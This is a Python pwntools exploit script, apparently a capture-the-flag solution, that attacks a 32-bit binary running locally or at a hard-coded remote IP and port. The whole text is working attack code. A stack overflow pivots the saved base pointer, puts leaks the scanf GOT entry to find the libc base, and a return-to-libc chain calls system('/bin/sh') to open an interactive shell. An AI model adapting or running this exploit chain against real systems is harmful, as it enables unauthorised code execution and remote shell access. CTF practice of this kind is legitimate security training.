from pwn import *

LOCAL = False#True
if LOCAL == True:
    r = process("./main")
    system_off = 0x0003cd10
    bin_sh_off = 0x0017b8cf
    __isoc99_scanf_off = 0x00063410
else:
    r = remote("54.225.38.91", 1028)
    system_off = 0x0458b0
    bin_sh_off = 0x19042d
    __isoc99_scanf_off = 0x055360

puts_plt = 0x8049030
__isoc99_scanf_got = 0x804c018
ret = 0x080491ac
main = 0x080491b7
pop_pop = 0x0804926a # pop edi ; pop ebp ; ret
pop_pop_pop = 0x08049269 # pop esi ; pop edi ; pop ebp ; ret
pop = 0x0804901e # pop ebx ; ret

r.recvuntil("o/\n\n")

if LOCAL == True:
    gdb.attach(r,"b system\nc")

### stack pivoting by overriding with \x00 the saved base pointer ####
p = ''
p += p32(ret)*22
p += p32(puts_plt)
p += p32(pop)
p += p32(__isoc99_scanf_got)
p += p32(main)
p += "BBBB"
r.sendline(p)

leak = r.recv(4)
print hexdump(leak)
leak = u32(leak)
print "[+] leak scanf: " + hex(leak)
libc_base = leak - __isoc99_scanf_off
print "[+] base: " + hex(libc_base)

p = ''
p += p32(ret)*23
p += p32(libc_base + system_off)
p += "asdf"
p += p32(libc_base + bin_sh_off)
p += "EEEE"
r.sendline(p)

r.interactive()
